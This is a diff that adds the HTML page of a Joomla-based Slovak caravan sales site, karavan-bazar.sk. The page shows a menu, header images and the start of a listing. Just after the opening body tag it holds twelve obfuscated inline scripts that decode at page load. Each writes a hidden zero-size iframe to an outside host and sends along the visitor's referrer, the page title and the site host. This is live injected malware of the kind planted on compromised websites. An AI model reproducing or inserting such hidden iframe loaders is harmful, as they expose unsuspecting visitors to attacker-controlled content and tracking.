@@ -1,0 +1,807 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- Template version 2.0 for Joomla! 1.5.x -->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="sk-sk" lang="sk-sk" dir="ltr">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="karavan, karavany" />
+  <meta name="description" content="Predaj karavanov, náhradných dielov a doplnkov." />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>Karavany</title>
+  <link rel="stylesheet" href="/media/system/css/modal.css" type="text/css" />
+  <link rel="stylesheet" href="/components/com_phocagallery/assets/phocagallery.css" type="text/css" />
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/media/system/js/modal.js"></script>
+  <script type="text/javascript">
+
+		window.addEvent('domready', function() {
+
+			SqueezeBox.initialize({});
+
+			$$('a.modal-button').each(function(el) {
+				el.addEvent('click', function(e) {
+					new Event(e).stop();
+					SqueezeBox.fromElement(el);
+				});
+			});
+		});
+  </script>
+  <!--[if lt IE 8]>
+<link rel="stylesheet" href="/components/com_phocagallery/assets/phocagalleryieall.css" type="text/css" />
+<![endif]-->
+  <style type="text/css">
+ #phocagallery .name {color: #b36b00 ;}
+ .phocagallery-box-file {background: #fcfcfc ; border:1px solid #e8e8e8;margin: 5px;padding: 5px;}
+ .phocagallery-box-file-first { background: url('/components/com_phocagallery/assets/images/shadow1.gif') 0 0 no-repeat; }
+ .phocagallery-box-file:hover, .phocagallery-box-file.hover {border:1px solid #b36b00 ; background: #f5f5f5 ;}
+.bgPhocaClass{
+			background:#666666;
+			filter:alpha(opacity=70);
+			opacity: 0.7;
+			-moz-opacity:0.7;
+			z-index:1000;
+			}
+			.fgPhocaClass{
+			background:#f6f6f6;
+			filter:alpha(opacity=100);
+			opacity: 1;
+			-moz-opacity:1;
+			z-index:1000;
+			}
+			.fontPhocaClass{
+			color:#000000;
+			z-index:1001;
+			}
+			.capfontPhocaClass, .capfontclosePhocaClass{
+			color:#ffffff;
+			font-weight:bold;
+			z-index:1001;
+			} </style>
+  <!--[if lt IE 7]>
+<style type="text/css">
+.phocagallery-box-file{
+ background-color: expression(isNaN(this.js)?(this.js=1, this.onmouseover=new Function("this.className+=' hover';"), 
+this.onmouseout=new Function("this.className=this.className.replace(' hover','');")):false););
+}
+ </style>
+<![endif]-->
+  <style type="text/css"> 
+ #sbox-window {background-color:#6b6b6b;padding:2px} 
+ #sbox-overlay {background-color:#000000;} 
+ </style>
+
+<link rel="shortcut icon" href="/images/favicon.ico" />
+<link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" />
+<link href="/templates/jsn_epic_pro/css/template.css" rel="stylesheet" type="text/css" media="screen" />
+<link href="/templates/jsn_epic_pro/css/template_green.css" rel="stylesheet" type="text/css" media="screen" /><style type="text/css">
+	#jsn-page {
+		width: 960px;
+	}
+	
+	#jsn-header {
+		height: 80px;
+	}
+	
+	#jsn-pinset {
+		right: 86px;
+	}
+	
+	#jsn-puser9 {
+		float: left;
+		width: 23%;
+	}
+	#jsn-pheader {
+		float: left;
+		width: 960px;
+	}
+	#jsn-puser8 {
+		float: right;
+		width: 23%;
+	}
+	
+	#jsn-leftsidecontent {
+		float: left;
+		width: 23%;
+	}
+	#jsn-maincontent {
+		float: left;
+		width: 960px;
+	}
+	#jsn-rightsidecontent {
+		float: right;
+		width: 23%;
+	}
+	
+			ul.menu-icon li.order1 a:link,
+			ul.menu-icon li.order1 a:visited {
+				background-image: url("http://karavan-bazar.sk/templates/jsn_epic_pro/images/icon-module-home.png");
+			}
+			
+			ul.menu-icon li.order2 a:link,
+			ul.menu-icon li.order2 a:visited {
+				background-image: url("http://karavan-bazar.sk/templates/jsn_epic_pro/images/icon-module-info.png");
+			}
+			
+			ul.menu-icon li.order3 a:link,
+			ul.menu-icon li.order3 a:visited {
+				background-image: url("http://karavan-bazar.sk/templates/jsn_epic_pro/images/icon-module-image.png");
+			}
+			
+			ul.menu-icon li.order4 a:link,
+			ul.menu-icon li.order4 a:visited {
+				background-image: url("http://karavan-bazar.sk/templates/jsn_epic_pro/images/icon-module-download.png");
+			}
+			
+			ul.menu-icon li.order5 a:link,
+			ul.menu-icon li.order5 a:visited {
+				background-image: url("http://karavan-bazar.sk/templates/jsn_epic_pro/images/icon-module-mail.png");
+			}
+			
+			ul.menu-icon li.order6 a:link,
+			ul.menu-icon li.order6 a:visited {
+				background-image: url("http://karavan-bazar.sk/templates/jsn_epic_pro/images/icon-module-comment.png");
+			}
+			
+	#jsn-master {
+		font-size: 75%;
+		font-family: Arial, Helvetica, sans-serif;
+	}
+	
+	h1, h2, h3, h4, h5, h6,
+	ul.menu-suckerfish a,
+	.componentheading, .contentheading {
+		font-family: Verdana, Geneva, sans-serif !important;
+	}
+	</style><script type="text/javascript" src="/templates/jsn_epic_pro/js/jsn_script.js"></script>
+	<script type="text/javascript">
+		var defaultFontSize = 75;
+	</script>
+	<script type="text/javascript" src="/templates/jsn_epic_pro/js/jsn_epic.js"></script>
+	<!--[if lte IE 6]>
+<link href="/templates/jsn_epic_pro/css/jsn_fixie6.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript">
+	var blankImg = '/images/blank.png';
+</script>
+<style type="text/css">
+	img {  behavior: url(/templates/jsn_epic_pro/js/iepngfix.htc); }
+</style>
+<![endif]-->
+<!--[if lte IE 7]>
+<script type="text/javascript" src="/templates/jsn_epic_pro/js/suckerfish.js"></script>
+<![endif]-->
+<!--[if IE 7]>
+<link href="/templates/jsn_epic_pro/css/jsn_fixie7.css" rel="stylesheet" type="text/css" />
+<![endif]-->
+</head>
+<body id="jsn-master">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+	<div id="jsn-page">
+		<div id="jsn-header">
+			<div id="jsn-logo"><a href="/index.php" title="Karavan Bazár - Predaj karavanov, náhradných dielov a doplnkov"><img src="/templates/jsn_epic_pro/images/logo.png" width="400" height="80" alt="Karavan Bazár - Predaj karavanov, náhradných dielov a doplnkov" /></a></div>
+					</div>
+		<div id="jsn-body">
+						<div id="jsn-mainmenu">
+								<div id="jsn-ptoolbar">		<div class="moduletable">
+					<ul class="menu-suckerfish"><li class="active item4 order3 first current"><a href="http://karavan-bazar.sk/" class="current"><span>Karavany</span></a></li><li class="item14 order4"><a href="/index.php?option=com_phocagallery&amp;view=category&amp;id=2&amp;Itemid=14"><span>Osobné autá</span></a></li><li class="item2 order5 last"><a href="/index.php?option=com_contact&amp;view=contact&amp;id=1&amp;Itemid=2"><span>Kontakt</span></a></li></ul>		</div>
+	</div>
+																<div id="jsn-fontresizer">
+					<ul class="hlist">
+						<li><a onclick="jsnChangeFontSize(-1);" title="Decrease font size" href="javascript:void(0)"><img alt="Decrease font size" src="/templates/jsn_epic_pro/images/font-decrease.png"/></a></li>
+						<li><a onclick="jsnResetFontSize();" title="Reset font size to default" href="javascript:void(0)"><img alt="Reset font size to default" src="/templates/jsn_epic_pro/images/font-reset.png"/></a></li>
+						<li><a onclick="jsnChangeFontSize(1);" title="Increase font size" href="javascript:void(0)"><img alt="Increase font size" src="/templates/jsn_epic_pro/images/font-increase.png"/></a></li>
+					</ul>
+				</div>
+							</div>
+									<div id="jsn-promo">
+												<div id="jsn-pheader" class="jsn-column">		<div class="moduletable_menu">
+					
+<!-- JoomlaWorks "Simple Image Rotator" Module (v1.2) starts here -->
+<noscript>
+	<div class="message">Sorry, but Javascript is not enabled in your browser!</div>
+</noscript>
+<script language="javascript" type="text/javascript">
+<!--
+var embedSIRCSS = '<' + 'style type="text/css" media="all">'
++ '@import "modules/mod_jw_sir/mod_jw_sir/mod_jw_sir.css";'
++ 'ul#jw-sir,ul#jw-sir li#jw-sir-loading {width:960px;height:250px;}'
++ '</' + 'style>';
+document.write(embedSIRCSS);
+-->
+</script>
+<script type="text/javascript" src="/modules/mod_jw_sir/mod_jw_sir/mod_jw_sir.js"></script>
+<script type="text/javascript">var delay=5000;var transition=40;var preLoader='jw-sir-loading';</script>
+<ul id="jw-sir" class="_menu">
+  <li id="jw-sir-loading"></li><li><img src="/images/stories/headers/CIMG1544.JPG" title="JoomlaWorks Simple Image Rotator" alt="JoomlaWorks Simple Image Rotator" style="width:960px;height:300px;" /></li><li><img src="/images/stories/headers/CIMG1752.JPG" title="JoomlaWorks Simple Image Rotator" alt="JoomlaWorks Simple Image Rotator" style="width:960px;height:300px;" /></li><li><img src="/images/stories/headers/CIMG1614.JPG" title="JoomlaWorks Simple Image Rotator" alt="JoomlaWorks Simple Image Rotator" style="width:960px;height:300px;" /></li><li><img src="/images/stories/headers/CIMG1574.JPG" title="JoomlaWorks Simple Image Rotator" alt="JoomlaWorks Simple Image Rotator" style="width:960px;height:300px;" /></li></ul>
+<!-- JoomlaWorks "Simple Image Rotator" Module (v1.2) ends here -->		</div>
+	</div>
+												<div class="clearbreak"></div>
+			</div>
+						<div id="jsn-content"><div id="jsn-content_inner1"><div id="jsn-content_inner2">
+								<div id="jsn-maincontent" class="jsn-column"><div id="jsn-maincontent_inner">
+										<div id="jsn-pathway"></div>
+															<div id="jsn-mainbody">
+						
+						<div class="componentheading">Karavany</div><div class="contentpane"><div class="contentdescription"><h2><strong>CONQUERROR</strong></h2>
